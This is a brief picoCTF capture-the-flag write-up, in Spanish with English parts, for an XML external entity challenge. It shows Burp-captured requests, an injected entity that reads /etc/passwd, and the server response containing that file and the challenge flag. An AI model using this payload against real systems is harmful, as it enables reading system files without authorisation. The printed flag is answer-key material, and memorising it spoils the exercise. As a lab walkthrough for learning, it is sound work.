## Objetivo
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Solución
Vemos la consulta con burpsuite
```http
POST /data HTTP/1.1

Host: saturn.picoctf.net:65236

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://saturn.picoctf.net:65236/

Content-Type: application/xml

Content-Length: 61

Origin: http://saturn.picoctf.net:65236

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>

<data><ID>

3

</ID></data>
```
Insertamos entidad externa y accedemos a la carpeta de las contraseñas
```HTTP
POST /data HTTP/1.1

Host: saturn.picoctf.net:65236

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://saturn.picoctf.net:65236/

Content-Type: application/xml

Content-Length: 137

Origin: http://saturn.picoctf.net:65236

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY toreplace SYSTEM '/etc/passwd'> ]>

<data><ID>

&toreplace;

</ID></data>
```

Reenviamos la consulta y vemos la respuesta
```
HTTP/1.1 200 OK

Server: Werkzeug/2.3.6 Python/3.8.10

Date: Tue, 01 Oct 2024 02:44:18 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 1025

Connection: close



Invalid ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```

## Notas Adicionales

## Referencias
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity